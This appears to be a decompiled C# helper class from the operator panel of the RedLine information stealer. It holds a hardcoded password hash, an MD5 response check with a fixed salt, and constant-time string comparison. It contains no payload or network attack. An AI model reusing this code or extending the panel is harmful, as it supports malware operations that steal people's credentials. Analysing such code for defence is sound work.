using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Security;

namespace RedLine.MainPanel.Data.Helpers;

public static class Encryptor
{
	private static object object_0 = new NetworkCredential("", "f67b65763eb7aba60092cc1aa276dfbc").SecurePassword;

	public static SecureString ToSecureString(this string @this)
	{
		return new NetworkCredential("", @this).SecurePassword;
	}

	private static uint smethod_0(IntPtr bstr1, IntPtr bstr2)
	{
		int num = Marshal.ReadInt32(bstr1, -4);
		int num2 = Marshal.ReadInt32(bstr2, -4);
		if (num != num2)
		{
			return 0u;
		}
		int num3 = 0;
		for (int i = 0; i < num; i++)
		{
			byte b = Marshal.ReadByte(bstr1 + i);
			byte b2 = Marshal.ReadByte(bstr2 + i);
			num3 |= b ^ b2;
		}
		return (num3 == 0) ? 1u : 0u;
	}

	public static bool Validate(SecureString s2)
	{
		IntPtr intPtr = Marshal.SecureStringToBSTR((SecureString)object_0);
		IntPtr intPtr2 = Marshal.SecureStringToBSTR(s2);
		try
		{
			return (byte)smethod_0(intPtr, intPtr2) != 0;
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
			Marshal.ZeroFreeBSTR(intPtr2);
		}
	}

	public static bool ValidateServer(string responseToken, string responseData)
	{
		return Md5Helper.GetMd5Hash(responseData + "=s@&^!(kda").ToLower().ToSecureString()
			.IsEquals(responseToken.ToSecureString());
	}

	public static bool IsEquals(this SecureString secureString, SecureString secureString2)
	{
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString);
		IntPtr intPtr2 = Marshal.SecureStringToBSTR(secureString2);
		try
		{
			return (byte)smethod_0(intPtr, intPtr2) != 0;
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
			Marshal.ZeroFreeBSTR(intPtr2);
		}
	}
}
